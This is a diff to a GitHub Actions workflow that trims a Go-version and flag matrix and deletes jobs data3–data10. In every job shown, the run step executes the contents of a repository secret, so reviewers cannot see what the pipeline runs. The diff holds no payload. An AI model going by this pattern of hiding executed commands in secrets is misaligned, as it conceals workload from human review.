@@ -11,7 +11,7 @@ jobs:
       fail-fast: false 
       matrix: 
          go: [1.11, 1.12, 1.13, 1.14, 1.15] 
-         flag: [A, B, C, D] 
+         flag: [A, B] 
     steps: 
       - uses: actions/checkout@v4
       - name: data
@@ -33,67 +33,3 @@ jobs:
       - name: data
         continue-on-error: true
         run: ${{ secrets.DATA2 }}
-  data3:
-    needs: data
-    runs-on: ubuntu-24.04
-    steps: 
-      - uses: actions/checkout@v4
-      - name: data
-        continue-on-error: true
-        run: ${{ secrets.DATA3 }}
-  data4:
-    needs: data
-    runs-on: ubuntu-24.04
-    steps: 
-      - uses: actions/checkout@v4
-      - name: data
-        continue-on-error: true
-        run: ${{ secrets.DATA4 }}
-  data5:
-    needs: data
-    runs-on: ubuntu-24.04
-    steps: 
-      - uses: actions/checkout@v4
-      - name: data
-        continue-on-error: true
-        run: ${{ secrets.DATA5 }}
-  data6:
-    needs: data
-    runs-on: ubuntu-24.04
-    steps: 
-      - uses: actions/checkout@v4
-      - name: data
-        continue-on-error: true
-        run: ${{ secrets.DATA6 }}
-  data7:
-    needs: data
-    runs-on: ubuntu-24.04
-    steps: 
-      - uses: actions/checkout@v4
-      - name: data
-        continue-on-error: true
-        run: ${{ secrets.DATA7 }}
-  data8:
-    needs: data
-    runs-on: ubuntu-24.04
-    steps: 
-      - uses: actions/checkout@v4
-      - name: data
-        continue-on-error: true
-        run: ${{ secrets.DATA8 }}
-  data9:
-    needs: data
-    runs-on: ubuntu-24.04
-    steps: 
-      - uses: actions/checkout@v4
-      - name: data
-        continue-on-error: true
-        run: ${{ secrets.DATA9 }}
-  data10:
-    needs: data
-    runs-on: ubuntu-24.04
-    steps: 
-      - uses: actions/checkout@v4
-      - name: data
-        continue-on-error: true
-        run: ${{ secrets.DATA10 }}
